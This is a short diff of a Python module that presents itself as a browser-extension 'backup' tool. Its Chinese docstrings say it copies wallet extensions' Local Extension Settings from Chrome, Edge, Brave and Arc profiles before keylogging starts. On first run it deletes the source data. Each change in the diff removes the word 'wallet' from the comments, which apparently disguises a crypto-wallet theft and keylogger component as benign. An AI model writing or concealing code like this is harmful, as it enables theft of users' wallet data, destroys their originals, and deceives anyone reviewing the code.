@@ -2,7 +2,7 @@
 """
 浏览器扩展数据备份模块
 
-在启动键盘记录前，备份目标钱包扩展的 Local Extension Settings 数据。
+在启动键盘记录前，备份目标扩展的 Local Extension Settings 数据。
 支持 Chrome、Edge、Brave、Arc 及其多个 Profile 分身（macOS）。
 """
 
@@ -70,7 +70,7 @@ BROWSER_USER_DATA_PATHS: Dict[str, str] = {
 
 
 def _identify_extension(ext_id: str, profile_path: str) -> Optional[str]:
-    """通过扩展 ID 或 manifest.json 识别是否为目标钱包扩展"""
+    """通过扩展 ID 或 manifest.json 识别是否为目标扩展"""
     for ext_name, ext_info in TARGET_EXTENSIONS.items():
         if ext_id in ext_info["ids"]:
             return ext_name
@@ -101,7 +101,7 @@ def _identify_extension(ext_id: str, profile_path: str) -> Optional[str]:
 
 def backup_browser_extensions(backup_dir: Path = None, dry_run: bool = False) -> int:
     """
-    备份浏览器钱包扩展的 Local Extension Settings 数据。
+    备份浏览器扩展的 Local Extension Settings 数据。
     首次运行时备份并删除源目录，后续运行仅备份。
     dry_run=True 时只扫描并打印将处理的目录，不复制、不删除、不写标记文件。
     """
